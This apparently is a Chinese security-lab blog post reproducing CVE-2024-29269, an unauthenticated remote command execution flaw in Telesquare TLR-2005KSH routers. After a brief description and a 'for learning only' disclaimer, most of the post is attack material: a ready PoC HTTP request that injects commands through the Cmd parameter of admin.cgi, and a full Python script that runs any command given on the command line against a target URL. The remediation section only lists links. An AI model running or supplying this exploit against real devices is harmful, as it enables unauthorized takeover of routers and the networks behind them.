#  【成功复现】Telesquare TLR-2005KSH路由器远程命令执行漏洞(CVE-2024-29269)   
原创 弥天安全实验室  弥天安全实验室   2024-04-07 18:17  
  
网安引领时代，弥天点亮未来     
  
  
  
  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
0x01漏洞介绍Telesquare Tlr-2005Ksh是韩国Telesquare公司的Sk Telecom Lte路由器。Telesquare TLR-2005Ksh 1.0.0和1.1.4版本存在未经授权的远程命令执行漏洞。攻击者可以利用此漏洞在未经Cmd参数授权的情况下执行系统命令并获取服务器权限。0x02影响版本Telesquare TLR-2005Ksh 1.0.0和1.1.4版本0x03漏洞复现  
1.访问漏洞环境  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hD6cYvxyqzfbrmtWsNCYB4g2E15shuk7ibfWbH0ccedYoElqdxzgichiaNRNuzBGlicpxFTupBNTu3f4w/640?wx_fmt=png&from=appmsg "")  
2.对漏洞进行复现 POC （GET）漏洞复现GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=id HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36Connection: closeAccept-Encoding: gzip执行id命令执行ls命令3.nuclei工具测试（漏洞存在）4.python工具测试（漏洞存在）python代码import sysimport requestsimport xml.etree.ElementTree as ETdef get_systemutil_response(url, command):    endpoint = f"/cgi-bin/admin.cgi?Command=sysCommand&Cmd={command}"    full_url = url.rstrip('/') + endpoint    headers = {        'Referer': url,    }    try:        response = requests.get(full_url, headers=headers)        if response.status_code == 200:            print("Response from", full_url)            #print(response.text)            root = ET.fromstring(response.text)            for cmd_result in root.findall('CmdResult'):                data = cmd_result.text.strip()                print(data)        else:            print("Error: Failed to fetch data. Status code:", response.status_code)    except requests.exceptions.RequestException as e:        print("Error:", e)if __name__ == "__main__":    if len(sys.argv) != 3:        print("Usage: python script.py <url> <command>")        sys.exit(1)    url = sys.argv[1]    command = sys.argv[2]    #proxy = {    #    'http': 'http://127.0.0.1:8080',    #    'https': 'https://127.0.0.1:8080',    #}    get_systemutil_response(url, command)0x04修复建议目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://github.com/wutalent/CVE-2024-29269/blob/main/index.mdhttps://gist.github.com/win3zz/c26047ae4b182c3619509d537b808d2bhttps://twitter.com/win3zz弥天简介学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。口号 网安引领时代，弥天点亮未来 知识分享完了喜欢别忘了关注我们哦~学海浩茫，予以风动，必降弥天之润！   弥  天安全实验室  
  
